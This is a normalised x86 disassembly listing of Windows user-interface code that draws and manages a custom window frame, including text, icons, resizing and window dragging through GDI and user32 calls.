call [ GdipSetPixelOffsetMode@IAT ]
test eax eax
je r-xdata
mov [ ebx + 0x4 ] eax
mov edi [ edi + 0xc ]
mov edx [ edi ]
push 0x5
push edx
call [ GdipSetInterpolationMode@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] eax
mov [ edi + 0x4 ] eax
sub_415610
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_446cc5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x78 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x90 ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov eax ecx
mov ecx [ edi + 0x8 ]
mov edx [ ecx ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x24 ] edx
xor ecx ecx
mov [ esp + 0x98 ] ecx
mov edx [ eax + 0x174 ]
mov esi [ eax + 0x4 ]
mov [ esp + 0x38 ] edx
mov edx [ eax + 0x178 ]
mov [ esp + 0x3c ] edx
mov edx [ eax + 0x17c ]
mov [ esp + 0x40 ] edx
mov edx [ eax + 0x180 ]
mov [ esp + 0x1c ] ecx
lea ecx [ esi + 0xb0 ]
lea ebx [ esp + 0x1c ]
lea eax [ esp + 0x20 ]
mov [ esp + 0x44 ] edx
call sub_414260
mov esi [ esi + 0xb4 ]
mov eax [ esp + 0x20 ]
cmp eax esi
je r-xdata
mov [ esp + 0x98 ] 0xffffffff
mov ecx [ esp + 0x90 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x78 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov esi [ eax + 0x10 ]
xor eax eax
cmp esi eax
je r-xdata
mov ebx [ esp + 0x18 ]
mov ecx [ ebx + 0x25c ]
cmp [ ecx + 0x189 ] al
je r-xdata
mov ecx [ ebx + 0x1b0 ]
push ecx
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] eax
mov [ esp + 0x4c ] eax
mov [ esp + 0x50 ] eax
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] eax
mov [ esp + 0x74 ] eax
mov [ esp + 0x78 ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] eax
mov [ esp + 0x68 ] eax
call [ IsZoomed@IAT ]
test eax eax
jne r-xdata
mov edx [ esi ]
mov eax [ esi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx esi
call edx
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
xor edx edx
push edx
mov [ esp + 0x84 ] ecx
lea ecx [ esp + 0x7c ]
push ecx
mov [ esp + 0x80 ] edx
mov [ esp + 0x84 ] edx
mov [ esp + 0x8c ] eax
mov eax [ esi ]
mov eax [ eax + 0x14 ]
lea edx [ esp + 0x40 ]
push edx
push edi
mov ecx esi
call eax
cmp [ ebx + 0x24d ] 0x0
jne r-xdata
mov [ esp + 0x17 ] 0x1
mov [ esp + 0x17 ] al
cmp [ ebx + 0x284 ] al
je r-xdata
lea eax [ ebx + 0x260 ]
push eax
call [ IsRectEmpty@IAT ]
test eax eax
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
lea ecx [ esp + 0x4c ]
push ecx
mov edx ecx
push edx
push edi
mov ecx esi
call eax
mov edx [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
mov eax [ esp + 0x40 ]
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x44 ]
mov [ esp + 0x2c ] edx
mov edx [ esp + 0x64 ]
sub edx [ esp + 0x5c ]
mov [ esp + 0x30 ] eax
sub eax [ esp + 0x60 ]
mov [ esp + 0x34 ] ecx
add eax [ esp + 0x58 ]
push 0x0
mov [ esp + 0x38 ] edx
lea ecx [ esp + 0x5c ]
push ecx
mov [ esp + 0x30 ] eax
mov eax [ esi ]
mov eax [ eax + 0x14 ]
lea edx [ esp + 0x30 ]
push edx
push edi
mov ecx esi
call eax
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x44 ]
mov [ esp + 0x28 ] eax
sub eax [ esp + 0x48 ]
mov [ esp + 0x2c ] ecx
add eax [ esp + 0x50 ]
mov ecx [ esp + 0x40 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x58 ]
sub eax [ esp + 0x60 ]
mov [ esp + 0x34 ] edx
add ecx eax
mov [ esp + 0x30 ] ecx
push 0x0
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x44 ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x48 ]
mov [ esp + 0x30 ] ecx
mov [ esp + 0x34 ] edx
mov [ esp + 0x38 ] eax
jmp r-xdata
mov eax [ ebx + 0x25c ]
lea edx [ esp + 0x48 ]
push edx
lea ecx [ esp + 0x5c ]
lea edx [ esp + 0x6c ]
call sub_4143a0
mov eax [ esp + 0x54 ]
sub eax [ esp + 0x4c ]
cmp [ esp + 0x17 ] 0x0
mov [ esp + 0x1c ] eax
push 0x0
je r-xdata
mov ecx [ ebx + 0x25c ]
cmp [ ecx + 0x187 ] al
jne r-xdata
mov edx [ esi ]
mov edx [ edx + 0x18 ]
lea eax [ esp + 0x6c ]
push eax
lea ecx [ esp + 0x30 ]
push ecx
push edi
mov ecx esi
call edx
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x25c ]
lea ecx [ esp + 0x48 ]
push ecx
lea ecx [ esp + 0x5c ]
lea edx [ esp + 0x6c ]
call sub_414420
cmp [ esp + 0x17 ] 0x0
je r-xdata
mov ecx [ esp + 0x54 ]
sub ecx [ esp + 0x4c ]
lea eax [ esp + 0x4c ]
mov [ esp + 0x34 ] ecx
mov edx [ esi ]
mov edx [ edx + 0x14 ]
push eax
lea ecx [ esp + 0x30 ]
push ecx
push edi
mov ecx esi
call edx
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x58 ]
sub edx [ esp + 0x60 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x44 ]
mov [ esp + 0x2c ] ecx
mov ecx [ esp + 0x40 ]
mov [ esp + 0x34 ] eax
sub eax [ esp + 0x54 ]
add edx ecx
add eax [ esp + 0x4c ]
mov [ esp + 0x30 ] ecx
push 0x0
mov [ esp + 0x2c ] edx
lea ecx [ esp + 0x5c ]
push ecx
mov [ esp + 0x34 ] eax
mov eax [ esi ]
mov eax [ eax + 0x14 ]
lea edx [ esp + 0x30 ]
push edx
push edi
mov ecx esi
call eax
mov eax [ esp + 0x44 ]
mov edx [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
mov [ esp + 0x34 ] eax
sub eax [ esp + 0x54 ]
mov [ esp + 0x2c ] edx
add eax [ esp + 0x4c ]
mov edx [ esp + 0x40 ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x50 ]
sub eax [ esp + 0x48 ]
push 0x0
add ecx eax
mov [ esp + 0x2c ] ecx
mov ecx [ esp + 0x5c ]
sub ecx [ esp + 0x64 ]
add edx ecx
mov [ esp + 0x34 ] edx
mov ecx [ esp + 0x78 ]
sub ecx [ esp + 0x70 ]
lea eax [ esp + 0x6c ]
mov [ esp + 0x38 ] ecx
mov edx [ esi ]
mov edx [ edx + 0x18 ]
push eax
lea ecx [ esp + 0x30 ]
push ecx
push edi
mov ecx esi
call edx
lea eax [ esp + 0x48 ]
push eax
mov eax [ ebx + 0x25c ]
lea ecx [ esp + 0x5c ]
lea edx [ esp + 0x6c ]
call sub_4144a0
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x4c ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x3c ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x40 ]
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x44 ]
mov [ esp + 0x34 ] eax
sub eax ecx
mov ebx ecx
add eax edx
sub ebx edx
cmp [ esp + 0x17 ] 0x0
push 0x0
mov [ esp + 0x30 ] eax
jne r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x108 ]
push edi
mov ecx ebx
call eax
jmp r-xdata
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
mov edx [ esp + 0x40 ]
mov [ esp + 0x2c ] ecx
add ecx [ esp + 0x1c ]
mov [ esp + 0x30 ] edx
mov edx [ esp + 0x44 ]
mov [ esp + 0x2c ] ecx
mov ecx [ esp + 0x50 ]
sub ecx [ esp + 0x48 ]
mov [ esp + 0x28 ] eax
add ecx eax
push 0x0
mov [ esp + 0x34 ] ecx
mov [ esp + 0x38 ] edx
sub [ esp + 0x38 ] ebx
mov edx [ esi ]
mov edx [ edx + 0x18 ]
lea eax [ esp + 0x4c ]
push eax
lea ecx [ esp + 0x30 ]
push ecx
push edi
mov ecx esi
call edx
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x44 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x3c ]
mov [ esp + 0x2c ] eax
add eax [ esp + 0x1c ]
push 0x0
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x5c ]
sub eax [ esp + 0x64 ]
mov [ esp + 0x34 ] ecx
add eax ecx
mov [ esp + 0x2c ] eax
mov [ esp + 0x38 ] edx
sub [ esp + 0x38 ] ebx
mov edx [ esi ]
mov edx [ edx + 0x18 ]
lea eax [ esp + 0x5c ]
push eax
lea ecx [ esp + 0x30 ]
push ecx
push edi
mov ecx esi
call edx
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x25c ]
cmp [ ecx + 0x195 ] 0x0
jne r-xdata
mov edx [ esp + 0x18 ]
mov eax [ edx + 0x25c ]
cmp [ eax + 0x195 ] 0x0
jne r-xdata
mov esi [ esp + 0x18 ]
cmp [ esi + 0x24d ] 0x0
jne r-xdata
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x40 ]
mov eax [ esp + 0x38 ]
mov [ esp + 0x2c ] ecx
add ecx [ esp + 0x1c ]
mov [ esp + 0x30 ] edx
mov edx [ esp + 0x44 ]
mov [ esp + 0x2c ] ecx
mov ecx [ esp + 0x50 ]
sub ecx [ esp + 0x48 ]
mov [ esp + 0x34 ] edx
mov edx [ esp + 0x58 ]
sub edx [ esp + 0x60 ]
sub [ esp + 0x34 ] ebx
add eax ecx
add [ esp + 0x30 ] edx
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x40 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x3c ]
mov [ esp + 0x30 ] ecx
mov ecx [ esp + 0x44 ]
mov [ esp + 0x2c ] eax
add eax [ esp + 0x1c ]
sub ecx ebx
mov [ esp + 0x2c ] eax
mov [ esp + 0x34 ] ecx
jmp r-xdata
add esi 0x260
push esi
call [ IsRectEmpty@IAT ]
test eax eax
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push 0x0
lea ecx [ esp + 0x6c ]
push ecx
lea edx [ esp + 0x30 ]
push edx
push edi
mov ecx esi
call eax
mov edx [ esp + 0x18 ]
mov eax [ edx + 0x25c ]
cmp [ eax + 0x187 ] 0x0
jne r-xdata
mov ecx [ esp + 0x50 ]
sub ecx [ esp + 0x48 ]
add ecx 0x4
cmp [ eax + 0x188 ] 0x0
jne r-xdata
mov eax [ edx ]
mov ecx edx
mov edx [ eax + 0x108 ]
push edi
call edx
mov ebx [ edx + 0x244 ]
test ebx ebx
je r-xdata
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push 0x3
push 0x0
push 0x0
sub eax 0x10
push 0x10
cdq
push 0x10
sub eax edx
push ebx
sar eax 0x1
push eax
push ecx
mov ecx [ esp + 0x44 ]
push ecx
call [ DrawIconEx@IAT ]
mov edx [ esp + 0x18 ]
sub_415c20
push ebp
mov ebp esp
push 0xffffffff
push sub_4492dd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi ecx
lea ebx [ edi + 0x270 ]
push ebx
call [ IsRectEmpty@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x248 ]
sub eax 0x10
call sub_4025f0
lea esi [ eax + 0x10 ]
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x4 ] 0x2
cmp [ esi - 0xc ] 0x0
jne r-xdata
mov eax [ esi - 0xc ]
test eax eax
je r-xdata
mov eax [ esi - 0x8 ]
mov ecx 0x1
sub ecx [ esi - 0x4 ]
sub eax 0x104
or eax ecx
jge r-xdata
mov [ ebp - 0x4 ] 0x0
add esi 0xfffffff0
lea eax [ esi + 0xc ]
or ecx 0xffffffff
[ eax ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x24 ]
push edx
push eax
call [ SelectObject@IAT ]
mov ecx [ edi + 0x25c ]
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x2c ] eax
mov eax [ ecx + 0x190 ]
push eax
push edx
call [ SetTextColor@IAT ]
cmp [ edi + 0x244 ] 0x0
mov eax [ ebx ]
mov ecx [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] eax
je r-xdata
mov edx [ edi + 0x1b0 ]
push 0x104
push esi
push edx
call [ GetWindowTextW@IAT ]
mov eax [ esi - 0x8 ]
push eax
push esi
call [ wcsnlen@IAT ]
add esp 0x8
test eax eax
js r-xdata
mov eax 0x104
lea ecx [ ebp - 0x28 ]
call sub_402c40
mov esi [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ esi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push esi
call eax
mov edi [ ebp - 0x24 ]
push 0x24
lea ecx [ ebp - 0x20 ]
push ecx
push 0xffffffff
push esi
push edi
call [ DrawTextW@IAT ]
mov edx [ ebp - 0x2c ]
push edx
push edi
call [ SelectObject@IAT ]
add [ ebp - 0x20 ] 0x14
push 0x80070057
call sub_402d00
cmp eax [ esi - 0x8 ]
jg r-xdata
xor ecx ecx
mov [ esi - 0xc ] eax
mov [ esi + eax * 2 ] cx
sub_415dc0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov esi ecx
cmp ebx 0x200
jne r-xdata
cmp ebx 0x2a3
jne r-xdata
cmp [ esi + 0x234 ] 0x0
jne r-xdata
mov edi [ ebp + 0x14 ]
mov [ esp + 0xc ] 0x0
cmp ebx 0x112
ja r-xdata
mov [ esi + 0x234 ] 0x0
mov eax [ esi + 0x1b0 ]
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x14 ] 0x10
mov [ esp + 0x18 ] 0x2
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] 0x0
call [ _TrackMouseEvent@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x21c ] 0x0
je r-xdata
je r-xdata
mov [ esi + 0x234 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push edi
push ecx
push ebx
push edx
mov ecx esi
call sub_418fb0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ esp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
and eax 0xfff0
cmp [ esi + 0x284 ] 0x0
jne r-xdata
lea eax [ ebx - 0x3 ]
cmp eax 0x9f
ja r-xdata
mov edx [ esi ]
push eax
mov eax [ edx + 0xf8 ]
mov ecx esi
call eax
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esi + 0x288 ] eax
movzx edx [ eax + lookup_table_416134 ]
jmp [ edx * 4 + jump_table_416108 ]
mov eax 0x1
mov [ esi + 0x21c ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov [ esi + 0x21c ] 0x1
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp + 0x10 ]
mov eax [ esi ]
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0xcc ]
push edi
push ecx
push ebx
push edx
mov ecx esi
call eax
mov [ esp + 0xc ] eax
mov [ esi + 0x21c ] 0x1
jmp r-xdata
mov ecx edi
shr ecx 0x10
push ecx
movzx edx di
push edx
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
mov [ esi + 0x21c ] 0x1
mov [ eax ] ecx
mov edx [ esi ]
mov eax [ edx + 0xd0 ]
mov ecx esi
call eax
mov [ esp + 0xc ] eax
jmp r-xdata
cmp [ esi + 0x24d ] 0x0
jne r-xdata
cmp [ esi + 0x24d ] 0x0
jne r-xdata
mov [ esi + 0x21c ] 0x1
mov [ esi + 0x28c ] 0x0
jmp r-xdata
mov ebx [ esi + 0x1b0 ]
push ebx
mov [ esi + 0x21c ] 0x1
call [ IsZoomed@IAT ]
cmp ebx [ esi + 0x1b0 ]
je r-xdata
mov edx [ esi + 0x1b0 ]
lea ecx [ esi + 0x40 ]
push ecx
push edx
call [ GetWindowRect@IAT ]
jmp r-xdata
mov ebx [ ebp + 0x10 ]
cmp ebx 0x2
je r-xdata
mov edx [ esi ]
mov ecx edi
shr ecx 0x10
movsx ecx cx
movsx eax di
push ecx
push eax
mov eax [ edx + 0xd4 ]
mov ecx esi
mov [ esi + 0x21c ] 0x1
call eax
mov [ esp + 0xc ] eax
jmp r-xdata
mov edx [ esi ]
mov edx [ edx + 0xd8 ]
mov ecx edi
shr ecx 0x10
movsx ecx cx
movsx eax di
push ecx
push eax
mov eax [ ebp + 0x10 ]
push eax
mov ecx esi
mov [ esi + 0x21c ] 0x1
call edx
jmp r-xdata
mov ecx edi
shr ecx 0x10
cmp [ esi + 0x28c ] 0x0
movsx eax di
movsx edx cx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
je r-xdata
push esi
mov eax ebx
call sub_417400
test al al
je r-xdata
mov eax [ esi + 0x70 ]
mov edx [ eax + 0x50 ]
lea ecx [ esi + 0x70 ]
push 0x97ddae7
call edx
test eax eax
je r-xdata
test ebx ebx
jne r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ esi ]
mov edx [ eax + 0x114 ]
mov ecx esi
call edx
test eax eax
je r-xdata
mov edx edi
shr edx 0x10
movsx ecx dx
mov edx [ esi ]
movsx eax di
push ecx
push eax
mov eax [ edx + 0xb4 ]
push ebx
mov ecx esi
call eax
jmp r-xdata
cmp ebx 0x2
sete cl
mov [ eax + 0x74 ] cl
cmp [ esi + 0x28d ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
sub eax [ esi + 0x290 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x2
jg r-xdata
cmp [ esi + 0x280 ] 0x0
mov [ esi + 0x28c ] 0x0
jne r-xdata
push esi
mov [ esi + 0x28d ] 0x1
call sub_416fd0
mov eax [ esi + 0x1b0 ]
push 0x0
push 0xf012
push 0x112
push eax
call [ PostMessageW@IAT ]
jmp r-xdata
mov eax [ esp + 0x14 ]
sub eax [ esi + 0x294 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x2
jle r-xdata
push 0x0
push 0x0
push 0x0
push 0x25
call [ SystemParametersInfoW@IAT ]
mov [ esi + 0x280 ] 0xffffffff
sub_41613f
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
add cl [ edx ]
or cl [ edx ]
add ecx [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or al [ eax + 0xa0a060a ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or al [ edi ]
or [ ecx ] cl
int3
sub_4161e0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0xf060
push esi
mov esi ecx
jne r-xdata
xor eax eax
pop esi
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ eax + 0xec ]
call edx
mov eax [ esi ]
mov edx [ eax + 0xf4 ]
lea ecx [ ebp + 0x8 ]
push ecx
mov ecx esi
mov [ ebp + 0x8 ] 0x0
call edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x78 ]
mov ecx esi
call edx
test al al
je r-xdata
mov [ esi + 0x21c ] 0x1
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x298 ] 0x0
je r-xdata
mov eax [ esi + 0x2a0 ]
sub eax [ esi + 0x29c ]
push edi
sar eax 0x2
xor edi edi
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0xe8 ]
mov ecx esi
call edx
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
pop edi
lea esp [ esp ]
mov edx [ ecx ]
mov eax [ esi + 0x8 ]
mov edx [ edx + 0x58 ]
push eax
call edx
mov ecx [ esi + 0x2a0 ]
sub ecx [ esi + 0x29c ]
inc edi
sar ecx 0x2
cmp edi ecx
jb r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
push 0x0
push 0x0
push 0x2
push esi
call eax
mov ecx [ esi + 0x29c ]
mov ecx [ ecx + edi * 4 ]
test ecx ecx
je r-xdata
sub_4162b0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
je r-xdata
pop esi
pop ebp
retn 0xc
cmp [ esi + 0x29 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ esi ]
mov edx [ ebp + 0xc ]
mov eax [ eax + 0xb8 ]
push ecx
push edx
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x10c ]
mov ecx esi
call eax
sub_416310
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x40 ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x44 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x48 ] edx
mov eax [ eax + 0xc ]
mov [ ecx + 0x4c ] eax
pop ebp
retn 0x4
sub_416340
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
push ebx
push esi
mov esi ecx
push edi
mov [ esp + 0x18 ] esi
call sub_417660
cmp [ esi + 0x29 ] 0x0
mov [ esp + 0x1c ] eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ esi + 0x78 ]
sub ebx [ esi + 0x74 ]
xor eax eax
sar ebx 0x2
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] eax
test ebx ebx
jle r-xdata
cmp [ esi + 0x238 ] 0x0
jne r-xdata
mov ecx [ esi + 0x74 ]
mov edi [ ecx + eax * 4 ]
test edi edi
je r-xdata
mov eax [ esp + 0x1c ]
cmp [ esi + 0x1a0 ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
inc eax
mov [ esp + 0x10 ] eax
cmp eax ebx
jl r-xdata
cmp [ edi + 0x24 ] 0x0
je r-xdata
mov ecx 0x7
lea edx [ esi + 0x154 ]
call sub_41ae80
cmp [ edi + 0x68 ] 0x0
je r-xdata
mov edx [ edi ]
mov eax [ edx + 0x74 ]
mov ecx edi
call eax
test al al
je r-xdata
mov edx [ edi + 0x4 ]
mov ecx [ esi + 0x1b0 ]
mov eax [ edx + 0x6c ]
cmp [ eax - 0xc ] 0x0
mov [ esp + 0x14 ] ecx
lea ecx [ esi + 0x1a4 ]
je r-xdata
cmp [ ecx + 0x4 ] 0x0
lea ebx [ ecx + 0x4 ]
je r-xdata
mov ebx [ esp + 0xc ]
push edi
lea edx [ esp + 0x24 ]
push edx
call sub_41a0c0
mov edi [ edi + 0x8 ]
mov esi [ esp + 0x14 ]
push eax
call sub_41a1d0
mov esi [ esp + 0x18 ]
sub_416420
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
mov edx [ esi ]
push edi
push eax
mov eax [ edx + 0xbc ]
push ebx
mov [ esi + 0x238 ] 0x1
call eax
mov eax [ ebp + 0xc ]
mov edx [ esi + 0x154 ]
mov edx [ edx + 0x8 ]
push 0x0
push eax
push ebx
lea ecx [ esi + 0x154 ]
call edx
mov ecx [ ebp + 0xc ]
mov eax [ esi ]
mov edx [ eax + 0xc0 ]
push ecx
push ebx
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x64 ]
mov ecx esi
call edx
mov ecx 0x7
lea edx [ esi + 0x154 ]
call sub_41ae80
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0xc4 ]
push eax
push ecx
mov ecx esi
call edx
mov [ esi + 0x238 ] 0x0
pop edi
mov eax [ esi + 0x74 ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
inc ebx
cmp ebx edi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x68 ]
call eax
sub_416500
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp [ esi + 0x24d ] 0x0
push edi
je r-xdata
mov edx [ ebp + 0xc ]
push edx
push ebx
push 0x0
push 0x0
lea edi [ esi + 0x50 ]
push edi
call [ SetRect@IAT ]
mov ecx [ esi + 0x25c ]
add ecx 0xc4
mov edx edi
lea eax [ ebp - 0x10 ]
call sub_40e630
mov ecx [ eax ]
mov [ esi + 0x30 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x34 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x38 ] ecx
mov edx [ eax + 0xc ]
mov eax [ esi + 0x1b0 ]
push eax
mov [ esi + 0x3c ] edx
call [ IsZoomed@IAT ]
test eax eax
je r-xdata
mov edi [ ebp + 0xc ]
push edi
push ebx
push 0x0
push 0x0
lea eax [ esi + 0x30 ]
push eax
call [ SetRect@IAT ]
push edi
push ebx
push 0x0
push 0x0
lea ecx [ esi + 0x50 ]
push ecx
call [ SetRect@IAT ]
add esi 0x270
push esi
call [ SetRectEmpty@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ esi + 0x25c ]
add ecx 0x174
mov edx edi
lea eax [ ebp - 0x10 ]
call sub_40e630
mov ecx [ eax ]
mov [ esi + 0x270 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x274 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x278 ] ecx
mov edx [ eax + 0xc ]
mov eax [ edi ]
mov ecx [ edi + 0x4 ]
mov [ esi + 0x260 ] eax
mov [ esi + 0x264 ] ecx
mov ecx [ esi + 0x34 ]
mov [ esi + 0x27c ] edx
mov edx [ edi + 0x8 ]
mov [ esi + 0x268 ] edx
pop edi
mov [ esi + 0x26c ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x38 ] ebx
sub_416610
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi ecx
cmp [ esi + 0x24d ] 0x0
push edi
je r-xdata
mov eax [ esi + 0x1b0 ]
lea edi [ esi + 0x50 ]
push edi
push eax
call [ GetClientRect@IAT ]
mov ecx [ esi + 0x25c ]
add ecx 0xc4
mov edx edi
lea eax [ ebp - 0x10 ]
call sub_40e630
mov ecx [ eax ]
mov [ esi + 0x30 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x34 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x38 ] ecx
